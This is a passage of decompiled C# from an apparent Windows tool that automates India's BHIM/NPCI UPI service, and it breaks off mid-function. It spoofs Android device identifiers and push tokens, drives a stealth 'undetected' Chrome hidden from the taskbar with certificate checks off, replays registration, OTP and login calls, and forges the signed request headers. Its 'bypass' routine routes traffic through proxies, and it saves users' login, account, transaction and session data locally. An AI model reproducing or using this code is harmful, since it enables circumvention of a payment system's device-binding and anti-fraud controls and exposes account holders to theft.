                        string text6 = "'";
                        string query = text5 + text + text6;
                        ExecuteQuery(query);
                    }
                }
            }
        }
        catch (Exception ex)
        {
            string text7 = ex.Message.ToString();
            string value = "file is encrypted or is not a database";
            if (!text7.Contains(value))
            {
                string text8 = ex.Message.ToString();
                string value2 = "unable to open database file";
                if (text8.Contains(value2))
                {
                    result = false;
                }
                else
                {
                    string text9 = ex.Message.ToString();
                    string value3 = "no such table: TBL_NPCI";
                    if (text9.Contains(value3))
                    {
                        SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
                        sQLiteConnection.Open();
                        SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
                        try
                        {
                            string[] array = new string[1];
                            string text10 = "CREATE TABLE TBL_NPCI(RID integer PRIMARY KEY AUTOINCREMENT, MobNo varchar(15), UPIAdd varchar(15), RegiInfo varchar(50000), LoginInfo varchar(100000), AccInfo varchar(100000), TrnsInfo varchar(100000), SessInfo varchar(100000), TimeStamp varchar(50));";
                            array[0] = text10;
                            for (int i = 0; i < array.Length; i++)
                            {
                                sQLiteCommand.CommandText = array[i];
                                sQLiteCommand.ExecuteNonQuery();
                            }
                            sQLiteCommand.Dispose();
                        }
                        catch
                        {
                        }
                        if (sQLiteConnection.State == ConnectionState.Open)
                        {
                            sQLiteConnection.Close();
                        }
                    }
                }
            }
            else
            {
                result = false;
            }
        }
        return result;
    }

    private void ExecuteQuery(string Query)
    {
        try
        {
            SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
            sQLiteConnection.Open();
            SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
            sQLiteCommand.CommandText = Query;
            sQLiteCommand.ExecuteNonQuery();
            sQLiteConnection.Close();
            sQLiteCommand.Dispose();
        }
        catch
        {
        }
    }

    internal UndetectedChromeDriver loadDriver()
    {
        Random random = new Random();
        Guid guid = Guid.NewGuid();
        string text = "N";
        string text2 = guid.ToString(text);
        string tempPath = Path.GetTempPath();
        string text3 = "uc_";
        string text4 = Path.Combine(tempPath, text3 + text2);
        ChromeOptions chromeOptions = new ChromeOptions();
        string argument = "--app=https://upi.npci.org.in";
        chromeOptions.AddArgument(argument);
        string argument2 = "--incognito";
        chromeOptions.AddArgument(argument2);
        string argument3 = "--disable-infobars";
        chromeOptions.AddArgument(argument3);
        string path = "Default";
        string text5 = Path.Combine(text4, path);
        Directory.CreateDirectory(text5);
        Dictionary<string, object> dictionary = new Dictionary<string, object>();
        string text6 = "credentials_enable_service";
        dictionary[text6] = false;
        string text7 = "profile";
        Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
        string text8 = "password_manager_enabled";
        dictionary2[text8] = false;
        string text9 = "default_content_setting_values";
        Dictionary<string, object> dictionary3 = new Dictionary<string, object>();
        string text10 = "notifications";
        dictionary3[text10] = 2;
        string text11 = "geolocation";
        dictionary3[text11] = 2;
        string text12 = "media_stream_mic";
        dictionary3[text12] = 2;
        string text13 = "media_stream_camera";
        dictionary3[text13] = 2;
        dictionary2[text9] = dictionary3;
        dictionary[text7] = dictionary2;
        string text14 = "offer_to_save_passwords";
        dictionary[text14] = false;
        string text15 = "autofill";
        Dictionary<string, object> dictionary4 = new Dictionary<string, object>();
        string text16 = "profile_enabled";
        dictionary4[text16] = false;
        string text17 = "credit_card_enabled";
        dictionary4[text17] = false;
        string text18 = "address_enabled";
        dictionary4[text18] = false;
        dictionary[text15] = dictionary4;
        Dictionary<string, object> value = dictionary;
        random.Next(138, 141).ToString();
        string path2 = "Preferences";
        string path3 = Path.Combine(text5, path2);
        string contents = JsonConvert.SerializeObject(value, Formatting.Indented);
        File.WriteAllText(path3, contents);
        string text19 = "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36";
        string value2 = text19;
        Dictionary<string, object> dictionary5 = new Dictionary<string, object>();
        string text20 = "deviceMetrics";
        Dictionary<string, object> dictionary6 = new Dictionary<string, object>();
        string text21 = "width";
        dictionary6.Add(text21, 412);
        string text22 = "height";
        dictionary6.Add(text22, 915);
        string text23 = "pixelRatio";
        dictionary6.Add(text23, 2.5);
        dictionary5.Add(text20, dictionary6);
        string text24 = "userAgent";
        dictionary5.Add(text24, value2);
        string argument4 = "--disable-blink-features=AutomationControlled";
        chromeOptions.AddArgument(argument4);
        string argument5 = "--ignore-certificate-errors";
        chromeOptions.AddArgument(argument5);
        string argument6 = "--ignore-certificate-errors-spki-list";
        chromeOptions.AddArgument(argument6);
        string text25 = "--user-data-dir=";
        chromeOptions.AddArgument(text25 + text4);
        string startupPath = Application.StartupPath;
        string path4 = "chromedriver.exe";
        string driverExecutablePath = Path.Combine(startupPath, path4);
        driver = UndetectedChromeDriver.Create(chromeOptions, null, driverExecutablePath, null, 0, 0, headless: false, noSandbox: true, suppressWelcome: true, hideCommandPromptWindow: false, null, null, delegate (ChromeDriverService service)
        {
            service.HideCommandPromptWindow = true;
            service.SuppressInitialDiagnosticInformation = true;
        });
        UndetectedChromeDriver undetectedChromeDriver = driver;
        string script = "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})";
        ((IJavaScriptExecutor)undetectedChromeDriver).ExecuteScript(script, Array.Empty<object>());
        IntPtr intPtr = ChromeTaskbarHider.FindBrowserWindowByUserDataDir(text4);
        if (intPtr != IntPtr.Zero)
        {
            ChromeTaskbarHider.HideFromTaskbar(intPtr);
        }
        int num = Screen.PrimaryScreen.WorkingArea.Height - random.Next(225, 250);
        driver.Manage().Window.Size = new Size(400, num);
        DevToolsSession devToolsSession = ((IDevTools)driver).GetDevToolsSession();
        SetUserAgentOverrideCommandSettings setUserAgentOverrideCommandSettings = new SetUserAgentOverrideCommandSettings();
        string userAgent = "okhttp/4.9.2";
        setUserAgentOverrideCommandSettings.UserAgent = userAgent;
        string platform = "Android";
        setUserAgentOverrideCommandSettings.Platform = platform;
        devToolsSession.SendCommand(setUserAgentOverrideCommandSettings);
        return driver;
    }

    private bool PostUsingBrowser33(UndetectedChromeDriver driver, string url, string reff, string body, ref string _response)
    {
        _response = "";
        bool result = true;
        try
        {
            string text = "\r\nvar callback = arguments[arguments.length - 1];\r\n\r\nvar url       = arguments[0];\r\nvar method    = (arguments[1] || 'GET').toUpperCase();\r\nvar headersIn = arguments[2] || {};\r\nvar body      = (arguments[3] != null ? arguments[3] : null);\r\n\r\n(function () {\r\n    // Ensure async callback always fires as microtask (as browser does)\r\n    Promise.resolve().then(function () {\r\n        try {\r\n            var xhr = new XMLHttpRequest();\r\n\r\n            // TRUE async mode\r\n            xhr.open(method, url, true);\r\n\r\n            // Set timeout (browser allows this)\r\n            xhr.timeout = 120000;\r\n\r\n            // Standard browser forbidden headers\r\n            var forbidden = [\r\n                'accept-encoding','connection','proxy-connection','content-length',\r\n                'host','origin','referer','user-agent','cookie','upgrade'\r\n            ];\r\n\r\n            function allowHeader(h) {\r\n                var x = h.toLowerCase();\r\n                return forbidden.indexOf(x) === -1;\r\n            }\r\n\r\n            // Apply allowed headers\r\n            var hasContentType = false;\r\n            Object.keys(headersIn).forEach(function (h) {\r\n                if (!allowHeader(h)) return;\r\n                if (h.toLowerCase() === 'content-type') hasContentType = true;\r\n\r\n                try { xhr.setRequestHeader(h, headersIn[h]); }\r\n                catch (e) { /* ignore */ }\r\n            });\r\n\r\n            if (body != null && !hasContentType)\r\n                xhr.setRequestHeader('Content-Type', 'application/json');\r\n\r\n            // Realistic event order\r\n            xhr.onload = function () {\r\n                finalize(xhr);\r\n            };\r\n\r\n            xhr.onerror = function () {\r\n                callback(JSON.stringify({\r\n                    ok: false,\r\n                    status: xhr.status || 0,\r\n                    error: 'network-error'\r\n                }));\r\n            };\r\n\r\n            xhr.ontimeout = function () {\r\n                callback(JSON.stringify({\r\n                    ok: false,\r\n                    status: xhr.status || 0,\r\n                    error: 'timeout'\r\n                }));\r\n            };\r\n\r\n            // Sends like a real browser\r\n            if (method === 'GET' || body == null) xhr.send();\r\n            else xhr.send(body);\r\n\r\n            function finalize(xhr) {\r\n                var respHeaders = {};\r\n\r\n                try {\r\n                    var raw = xhr.getAllResponseHeaders() || '';\r\n                    raw.trim().split(/[\\r\\n]+/).forEach(function (line) {\r\n                        var idx = line.indexOf(':');\r\n                        if (idx < 1) return;\r\n                        var key = line.substring(0, idx).trim();\r\n                        var val = line.substring(idx + 1).trim();\r\n                        respHeaders[key] = val;\r\n                    });\r\n                } catch (e) {}\r\n\r\n                callback(JSON.stringify({\r\n                    ok: (xhr.status >= 200 && xhr.status < 300),\r\n                    status: xhr.status,\r\n                    statusText: xhr.statusText,\r\n                    headersReceived: respHeaders,\r\n                    body: xhr.responseText\r\n                }));\r\n            }\r\n        } catch (err) {\r\n            callback(JSON.stringify({\r\n                ok: false,\r\n                status: 0,\r\n                error: String(err)\r\n            }));\r\n        }\r\n    });\r\n})();\r\n";
            string script = text;
            driver.Manage().Timeouts().AsynchronousJavaScript = TimeSpan.FromSeconds(180.0);
            Dictionary<string, string> dictionary = new Dictionary<string, string>();
            string text2 = "Accept-Language";
            string value = "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6";
            dictionary.Add(text2, value);
            string text3 = "accept";
            string value2 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
            dictionary.Add(text3, value2);
            Dictionary<string, string> dictionary2 = dictionary;
            if (string.IsNullOrEmpty(xcaccessid))
            {
                string text4 = "x-caccess-id";
                string value3 = "null";
                dictionary2[text4] = value3;
            }
            else
            {
                string text5 = "x-caccess-id";
                dictionary2[text5] = xcaccessid;
            }
            if (string.IsNullOrEmpty(xsignature))
            {
                string text6 = "x-signature";
                string value4 = "-";
                dictionary2[text6] = value4;
            }
            else
            {
                string text7 = "x-signature";
                dictionary2[text7] = xsignature;
            }
            if (!string.IsNullOrEmpty(xlogintoken))
            {
                string text8 = "x-login-token";
                dictionary2[text8] = xlogintoken;
            }
            string value5 = "https://upi.npci.org.in/api/v3/npci/token";
            if (!url.Contains(value5))
            {
                string value6 = DateTimeOffset.Now.ToUnixTimeSeconds().ToString();
                string text9 = "x-timestamp";
                dictionary2[text9] = value6;
            }
            else
            {
                string text10 = "x-timestamp";
                dictionary2[text10] = timestampheader;
            }
            object[] array = new object[4] { url, null, null, null };
            string text11 = "POST";
            array[1] = text11;
            array[2] = dictionary2;
            array[3] = body;
            string text12 = (string)driver.ExecuteAsyncScript(script, array);
            try
            {
                string text13 = text12 ?? text12?.ToString();
                if (!string.IsNullOrEmpty(text13))
                {
                    Dictionary<string, object> dictionary3 = new JavaScriptSerializer().Deserialize<Dictionary<string, object>>(text13);
                    string text14 = "body";
                    _response = dictionary3[text14].ToString();
                    string text15 = "headersReceived";
                    if (dictionary3.TryGetValue(text15, out var value7) && value7 != null && value7 is IDictionary<string, object> dictionary4)
                    {
                        string[] array2 = new string[1];
                        string text16 = "x-request-for";
                        array2[0] = text16;
                        string[] array3 = array2;
                        string[] array4 = array3;
                        foreach (string text17 in array4)
                        {
                            if (dictionary4.TryGetValue(text17, out var value8) && value8 != null)
                            {
                                value8.ToString();
                                break;
                            }
                        }
                    }
                    result = true;
                }
            }
            catch (Exception)
            {
            }
        }
        catch (Exception)
        {
        }
        return result;
    }

    private bool method_5(string string_37, string string_38, string string_39, ref WebProxy webProxy_2, ref CookieContainer cookieContainer_2, bool bool_2, bool bool_3, int int_2, int int_3, ref string string_40, ref string string_41, ref WebException webException_2)
    {
        //IL_0289: Expected O, but got Unknown
        //IL_0020: Unknown result type (might be due to invalid IL or missing references)
        //IL_0025: Unknown result type (might be due to invalid IL or missing references)
        //IL_002e: Unknown result type (might be due to invalid IL or missing references)
        //IL_003a: Unknown result type (might be due to invalid IL or missing references)
        //IL_0041: Unknown result type (might be due to invalid IL or missing references)
        //IL_0049: Expected O, but got Unknown
        //IL_0074: Unknown result type (might be due to invalid IL or missing references)
        //IL_007b: Expected O, but got Unknown
        //IL_00ab: Unknown result type (might be due to invalid IL or missing references)
        //IL_00b2: Expected O, but got Unknown
        //IL_01e5: Unknown result type (might be due to invalid IL or missing references)
        //IL_01ef: Expected O, but got Unknown
        string_41 = "";
        string_40 = "";
        webException_2 = null;
        HttpResponseMessage val = null;
        try
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
            HttpClientHandler val2 = new HttpClientHandler
            {
                Proxy = webProxy_2,
                UseProxy = (webProxy_2 != null),
                AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate),
                UseCookies = true
            };
            CookieContainer cookieContainer;
            if ((cookieContainer = cookieContainer_2) == null)
            {
                cookieContainer = new CookieContainer();
            }
            val2.CookieContainer = cookieContainer;
            HttpClientHandler val3 = val2;
            if (cookieContainer_2 == null)
            {
                cookieContainer_2 = val3.CookieContainer;
            }
            HttpClient val4 = new HttpClient((HttpMessageHandler)(object)val3);
            try
            {
                val4.Timeout = TimeSpan.FromMilliseconds((int_2 <= 0) ? 30000 : int_2);
                HttpRequestMessage val5 = new HttpRequestMessage(string.IsNullOrEmpty(string_38) ? HttpMethod.Get : HttpMethod.Post, string_37);
                val5.Headers.ExpectContinue = true;
                HttpHeaderValueCollection<ProductInfoHeaderValue> userAgent = val5.Headers.UserAgent;
                string text = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
                userAgent.ParseAdd(text);
                HttpRequestHeaders headers = val5.Headers;
                string text2 = "x-caccess-id";
                string text3;
                if (!string.IsNullOrEmpty(xcaccessid))
                {
                    text3 = xcaccessid;
                }
                else
                {
                    string text4 = "null";
                    text3 = text4;
                }
                ((HttpHeaders)headers).TryAddWithoutValidation(text2, text3);
                HttpRequestHeaders headers2 = val5.Headers;
                string text5 = "x-signature";
                string text6;
                if (!string.IsNullOrEmpty(xsignature))
                {
                    text6 = xsignature;
                }
                else
                {
                    string text7 = "-";
                    text6 = text7;
                }
                ((HttpHeaders)headers2).TryAddWithoutValidation(text5, text6);
                if (!string.IsNullOrEmpty(xlogintoken))
                {
                    HttpRequestHeaders headers3 = val5.Headers;
                    string text8 = "x-login-token";
                    ((HttpHeaders)headers3).TryAddWithoutValidation(text8, xlogintoken);
                }
                long num = DateTimeOffset.Now.ToUnixTimeSeconds();
                HttpRequestHeaders headers4 = val5.Headers;
                string text9 = "x-timestamp";
                ((HttpHeaders)headers4).TryAddWithoutValidation(text9, num.ToString());
                if (!string.IsNullOrEmpty(string_38))
                {
                    Encoding uTF = Encoding.UTF8;
                    string text10 = "application/json";
                    val5.Content = (HttpContent)new StringContent(string_38, uTF, text10);
                }
                val = val4.SendAsync(val5).GetAwaiter().GetResult();
                string text11 = "";
                if (bool_3)
                {
                    text11 = val.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                }
                HttpResponseHeaders headers5 = val.Headers;
                string text12 = "X-Request-For";
                IEnumerable<string> source = default(IEnumerable<string>);
                if (((HttpHeaders)headers5).TryGetValues(text12, out source))
                {
                    source.FirstOrDefault()?.Trim();
                }
                string_40 = text11;
                return true;
            }
            finally
            {
                ((IDisposable)val4).Dispose();
            }
        }
        catch (WebException ex)
        {
            string_41 = (webException_2 = ex).Message;
            return false;
        }
        catch (HttpRequestException val6)
        {
            HttpRequestException val7 = val6;
            string_41 = ((Exception)(object)val7).Message;
            return false;
        }
        catch (Exception ex2)
        {
            string_41 = ex2.Message;
            return false;
        }
        finally
        {
            if (val != null)
            {
                val.Dispose();
            }
        }
    }

    private bool method_5_(string string_37, string string_38, string string_39, ref WebProxy webProxy_2, ref CookieContainer cookieContainer_2, bool bool_2, bool bool_3, int int_2, int int_3, ref string string_40, ref string string_41, ref WebException webException_2)
    {
        //IL_0289: Expected O, but got Unknown
        //IL_0020: Unknown result type (might be due to invalid IL or missing references)
        //IL_0025: Unknown result type (might be due to invalid IL or missing references)
        //IL_002e: Unknown result type (might be due to invalid IL or missing references)
        //IL_003a: Unknown result type (might be due to invalid IL or missing references)
        //IL_0041: Unknown result type (might be due to invalid IL or missing references)
        //IL_0049: Expected O, but got Unknown
        //IL_0074: Unknown result type (might be due to invalid IL or missing references)
        //IL_007b: Expected O, but got Unknown
        //IL_00ab: Unknown result type (might be due to invalid IL or missing references)
        //IL_00b2: Expected O, but got Unknown
        //IL_01e5: Unknown result type (might be due to invalid IL or missing references)
        //IL_01ef: Expected O, but got Unknown
        string_41 = "";
        string_40 = "";
        webException_2 = null;
        HttpResponseMessage val = null;
        try
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
            HttpClientHandler val2 = new HttpClientHandler
            {
                Proxy = webProxy_2,
                UseProxy = (webProxy_2 != null),
                AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate),
                UseCookies = true
            };
            CookieContainer cookieContainer;
            if ((cookieContainer = cookieContainer_2) == null)
            {
                cookieContainer = new CookieContainer();
            }
            val2.CookieContainer = cookieContainer;
            HttpClientHandler val3 = val2;
            if (cookieContainer_2 == null)
            {
                cookieContainer_2 = val3.CookieContainer;
            }
            HttpClient val4 = new HttpClient((HttpMessageHandler)(object)val3);
            try
            {
                val4.Timeout = TimeSpan.FromMilliseconds((int_2 <= 0) ? 30000 : int_2);
                HttpRequestMessage val5 = new HttpRequestMessage(string.IsNullOrEmpty(string_38) ? HttpMethod.Get : HttpMethod.Post, string_37);
                val5.Headers.ExpectContinue = true;
                HttpHeaderValueCollection<ProductInfoHeaderValue> userAgent = val5.Headers.UserAgent;
                string text = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
                userAgent.ParseAdd(text);
                HttpRequestHeaders headers = val5.Headers;
                string text2 = "x-caccess-id";
                string text3;
                if (!string.IsNullOrEmpty(xcaccessid))
                {
                    text3 = xcaccessid;
                }
                else
                {
                    string text4 = "null";
                    text3 = text4;
                }
                ((HttpHeaders)headers).TryAddWithoutValidation(text2, text3);
                HttpRequestHeaders headers2 = val5.Headers;
                string text5 = "x-signature";
                string text6;
                if (!string.IsNullOrEmpty(xsignature))
                {
                    text6 = xsignature;
                }
                else
                {
                    string text7 = "-";
                    text6 = text7;
                }
                ((HttpHeaders)headers2).TryAddWithoutValidation(text5, text6);
                if (!string.IsNullOrEmpty(xlogintoken))
                {
                    HttpRequestHeaders headers3 = val5.Headers;
                    string text8 = "x-login-token";
                    ((HttpHeaders)headers3).TryAddWithoutValidation(text8, xlogintoken);
                }
                long num = DateTimeOffset.Now.ToUnixTimeSeconds();
                HttpRequestHeaders headers4 = val5.Headers;
                string text9 = "x-timestamp";
                ((HttpHeaders)headers4).TryAddWithoutValidation(text9, num.ToString());
                if (!string.IsNullOrEmpty(string_38))
                {
                    Encoding uTF = Encoding.UTF8;
                    string text10 = "application/json";
                    val5.Content = (HttpContent)new StringContent(string_38, uTF, text10);
                }
                val = val4.SendAsync(val5).GetAwaiter().GetResult();
                string text11 = "";
                if (bool_3)
                {
                    text11 = val.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                }
                HttpResponseHeaders headers5 = val.Headers;
                string text12 = "X-Request-For";
                IEnumerable<string> source = default(IEnumerable<string>);
                if (((HttpHeaders)headers5).TryGetValues(text12, out source))
                {
                    source.FirstOrDefault()?.Trim();
                }
                string_40 = text11;
                return true;
            }
            finally
            {
                ((IDisposable)val4).Dispose();
            }
        }
        catch (WebException ex)
        {
            string_41 = (webException_2 = ex).Message;
            return false;
        }
        catch (HttpRequestException val6)
        {
            HttpRequestException val7 = val6;
            string_41 = ((Exception)(object)val7).Message;
            return false;
        }
        catch (Exception ex2)
        {
            string_41 = ex2.Message;
            return false;
        }
        finally
        {
            if (val != null)
            {
                val.Dispose();
            }
        }
    }

    private void btn_bypass_Click(object sender, EventArgs e)
    {
        if (ip)
        {
            try
            {
                string text = ipfor;
                string[] array = new string[1];
                string text2 = ":";
                array[0] = text2;
                string[] array2 = text.Split(array, StringSplitOptions.None);
                if (array2.Length > 3)
                {
                    webProxy_3 = new WebProxy(array2[0].Trim(), int.Parse(array2[1].Trim()));
                    webProxy_3.BypassProxyOnLocal = true;
                    webProxy_3.Credentials = new NetworkCredential(array2[2].Trim(), array2[3].Trim());
                }
            }
            catch
            {
            }
        }
        if (mobilenumber.Text.Length != 10)
        {
            string text3 = "Enter Valid mobile number without 91 ";
            MessageBox.Show(text3);
        }
        else if (txt_pass.Text.Length == 4)
        {
            modelname = smethod_0();
            base.Name = method_1();
            string string_ = "abcdefghijklmnopqrstuvwxyz1234567890";
            oemdeviceid = RandomStrinAg(32, string_);
            string chars = "1234567890";
            RandomString(10, chars);
            string text4 = num.ToString();
            string text5 = "FTS";
            androidid = sha256(text4 + text5 + num).ToLower().Substring(0, 16);
            simid = simidd();
            oemdeviceid = Guid.NewGuid().ToString();
            string text6 = oemdeviceid;
            string oldValue = "-";
            oemdeviceid = text6.Replace(oldValue, "");
            string string_2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
            androidid = RandomStrinAg(16, string_2).ToLower();
            num = 15000;
            fakeGcmToken = GetRandomGCMToken();
            string text7 = "SBI239AB591680946F2BB8C432363E3E8F1";
            safety = text7;
            appgenid();
            string text8 = "";
            string text9 = "https://upi.npci.org.in/api/v1/devices?embed=registrationToken";
            string_93 = text9;
            string text10 = "{\"deviceId\":\"18bb399033d73d51\",\"os\":\"ANDROID\",\"version\":\"12\",\"manufacturer\":\"Samsung\",\"model\":\"G781BZBGINS\",\"packageName\":\"in.org.npci.upiapp\",\"osVersion\":\"30\",\"appVersion\":\"4.0.16\",\"bundleVersion\":\"\",\"configVersion\":\"\",\"gcmId\":\"BE6tzuHmURIzCvUq4\"}";
            text8 = text10;
            string text11 = text8;
            string oldValue2 = "18bb399033d73d51";
            text8 = text11.Replace(oldValue2, androidid.ToUpper());
            string text12 = text8;
            string oldValue3 = "BE6tzuHmURIzCvUq4";
            text8 = text12.Replace(oldValue3, fakeGcmToken);
            string text13 = text8;
            string oldValue4 = "G781BZBGINS";
            text8 = text13.Replace(oldValue4, modelname);
            ConnectHttp(string_93, text8, string_92, ref webProxy_3, ref cookieContainer_3, bool_63: false, bool_64: true, 120000, 120000, ref response, ref string_95, ref webException_0);
            string text14 = string_95;
            string value = "Unable to connect to the remote server";
            if (!text14.Contains(value))
            {
                string text15 = response;
                string value2 = "registrationToken";
                if (text15.Contains(value2))
                {
                    string text16 = response;
                    string text17 = response;
                    string value3 = "id";
                    string text18 = text16.Substring(text17.IndexOf(value3) + 5);
                    string value4 = "\"";
                    xcrfff = text18.Substring(0, text18.IndexOf(value4));
                    string text19 = response;
                    string text20 = response;
                    string value5 = "multistrategyVMNs";
                    string text21 = text19.Substring(text20.IndexOf(value5) + 5);
                    string value6 = "default";
                    string text22 = text21.Substring(text21.IndexOf(value6) + 5);
                    string value7 = "number";
                    string text23 = text22.Substring(text22.IndexOf(value7) + 9);
                    string value8 = "\"";
                    NUMMM = text23.Substring(0, text23.IndexOf(value8));
                    string value9 = "content";
                    string text24 = text23.Substring(text23.IndexOf(value9) + 10);
                    string value10 = "\"";
                    TextSms = text24.Substring(0, text24.IndexOf(value10));
                    string text25 = response;
                    string text26 = response;
                    string value11 = "additionalConten";
                    string text27 = text25.Substring(text26.IndexOf(value11) + 20);
                    string value12 = "\"";
                    EXREATextSms = text27.Substring(0, text27.IndexOf(value12));
                    string eXREATextSms = EXREATextSms;
                    string text28 = "<";
                    string textSms = TextSms;
                    string text29 = ">";
                    string value13 = eXREATextSms + text28 + textSms + text29;
                    while (string.IsNullOrEmpty(value13))
                    {
                    }
                    pictureBox1.Visible = true;
                    string[] array3 = new string[7];
                    string text30 = "SMSTO:0";
                    array3[0] = text30;
                    array3[1] = NUMMM;
                    string text31 = ":";
                    array3[2] = text31;
                    array3[3] = EXREATextSms;
                    string text32 = "<";
                    array3[4] = text32;
                    array3[5] = TextSms;
                    string text33 = ">";
                    array3[6] = text33;
                    string plainText = string.Concat(array3);
                    string graphic = new Base64QRCode(new QRCodeGenerator().CreateQrCode(plainText, QRCodeGenerator.ECCLevel.Q)).GetGraphic(20);
                    pictureBox1.Image = LoadImage(graphic);
                    pnlQR.Left = 3;
                    pnlQR.BringToFront();
                    btnNext.Visible = true;
                }
                string text34 = response;
                string value14 = "error\":true";
                if (text34.Contains(value14))
                {
                    string str = response;
                    string what = "userMessage";
                    jsonData_Serial(str, what);
                }
            }
            else
            {
                string text35 = "Please Use Proxy for Registration.";
                MessageBox.Show(text35);
            }
        }
        else
        {
            string text36 = "Enter Valid BHIM Mobile Upi APP 4 DIgit Password \r\n\r\nNote:- Yaha par apko apke sbi upi application ka pin enter karna jo apne registration karte wakt set kiya \r\n\r\nYaha par UPI Payment Pin Enter Na Kare.";
            MessageBox.Show(text36);
        }
    }

    private void btnNext_Click(object sender, EventArgs e)
    {
        pnlQR.Left = 500;
        int num = 0;
        while (true)
        {
            num++;
            string text = Convert.ToString((int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
            timestampheader = text.ToString();
            string text2 = "{\"registrationDeviceId\":\"";
            string text3 = xcrfff;
            string text4 = "\",\"type\":\"getToken\"}";
            string data = text2 + text3 + text4;
            string text5 = "https://upi.npci.org.in/api/v1/tokens";
            string_93 = text5;
            ConnectHttp(string_93, data, string_92, ref webProxy_3, ref cookieContainer_3, bool_63: false, bool_64: true, 180000, 180000, ref string_96, ref string_95, ref webException_0);
            string str = string_96;
            string what = "mobileNumber";
            mobilenumberr = jsonData_Serial(str, what);
            string str2 = string_96;
            string what2 = "decryptedValue";
            registertoken = jsonData_Serial(str2, what2);
            bool flag = string.IsNullOrEmpty(mobilenumberr) && num < 3;
            string text6 = string_96;
            string value = "Kindly try again after 24 hours to link your device successfully";
            if (!(flag & !text6.Contains(value)))
            {
                break;
            }
            Thread.Sleep(1000);
        }
        string text7 = string_96;
        string value2 = "Kindly try again after 24 hours to link your device successfully";
        if (!text7.Contains(value2))
        {
            if (!string.IsNullOrEmpty(mobilenumberr))
            {
                string text8 = "{\"mobileNumber\":\"917978499642\",\"tokenId\":\"";
                string text9 = xcrfff;
                string text10 = "\"}";
                string text11 = text8 + text9 + text10;
                string text12 = text11;
                string oldValue = "917978499642";
                text11 = text12.Replace(oldValue, mobilenumberr);
                string text13 = "https://upi.npci.org.in/api/v1/tokens/reqOtp";
                string_93 = text13;
                ConnectHttp(string_93, text11, string_92, ref webProxy_3, ref cookieContainer_3, bool_63: false, bool_64: true, 180000, 180000, ref string_96, ref string_95, ref webException_0);
                string text14 = string_96;
                string value3 = "error\":true";
                if (!text14.Contains(value3))
                {
                    string text15 = string_96;
                    string value4 = "true";
                    if (!text15.Contains(value4))
                    {
                        return;
                    }
                    string prompt = "Enter Otp Received....";
                    string title = "Express";
                    string text16 = Interaction.InputBox(prompt, title);
                    string[] array = new string[5];
                    string text17 = "{\"mobileNumber\":\"917978499642\",\"tokenId\":\"";
                    array[0] = text17;
                    array[1] = xcrfff;
                    string text18 = "\",\"otp\":\"";
                    array[2] = text18;
                    array[3] = text16;
                    string text19 = "\"}";
                    array[4] = text19;
                    text11 = string.Concat(array);
                    string text20 = text11;
                    string oldValue2 = "917978499642";
                    text11 = text20.Replace(oldValue2, mobilenumberr);
                    string text21 = "https://upi.npci.org.in/api/v3/tokens/verifyOtp";
                    string_93 = text21;
                    ConnectHttp(string_93, text11, string_92, ref webProxy_3, ref cookieContainer_3, bool_63: false, bool_64: true, 180000, 180000, ref string_96, ref string_95, ref webException_0);
                    string text22 = string_96;
                    string value5 = "error\":true";
                    if (!text22.Contains(value5))
                    {
                        string text23 = string_96;
                        string value6 = "otpVerified\":true";
                        if (!text23.Contains(value6))
                        {
                            return;
                        }
                        xcaccessid = xcrfff;
                        string inputString = txt_pass.Text;
                        string inputString2 = mobilenumberr;
                        string text24 = sha256(sha256(sha256(inputString) + passCodeConstant) + passCodeConstant);
                        string text25 = sha256(inputString2);
                        string text26 = sha256(text24 + text25 + passCodeConstant);
                        text26 = sha256(sha256(text26 + passCodeConstant));
                        text26 = sha256(text26 + passCodeConstant);
                        text26 = sha256(text26 + passCodeConstant);
                        text26 = sha256(text26 + text25 + passCodeConstant);
                        text26 = sha256(text26 + passCodeConstant);
                        string text27 = "{\"os\":\"ANDROID\",\"passcode\":\"";
                        string text28 = text26;
                        string text29 = "\",\"appVersion\":\"4.0.6\"}";
                        text11 = text27 + text28 + text29;
                        string text30 = "https://upi.npci.org.in/api/v3/loginTokens";
                        string_93 = text30;
                        string s = registertoken;
                        string text31 = Convert.ToString((int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
                        Encoding uTF = Encoding.UTF8;
                        string text32 = text31;
                        string text33 = "|/api/v3/loginTokens|W29iamVjdCBPYmplY3Rd";
                        string s2 = Convert.ToBase64String(uTF.GetBytes(text32 + text33));
                        byte[] inArray = HashHMAC(Encoding.UTF8.GetBytes(s), Encoding.UTF8.GetBytes(s2));
                        string text34 = "v1|";
                        xsignature = text34 + Convert.ToBase64String(inArray);
                        ConnectHttp(string_93, text11, string_92, ref webProxy_3, ref cookieContainer_3, bool_63: false, bool_64: true, 180000, 180000, ref string_96, ref string_95, ref webException_0);
                        string str3 = string_96;
                        string what3 = "fingerprint";
                        androidid = jsonData_Serial(str3, what3);
                        string text35 = string_96;
                        string value7 = "error\":true";
                        if (!text35.Contains(value7))
                        {
                            string str4 = string_96;
                            string what4 = "defaultVpa";
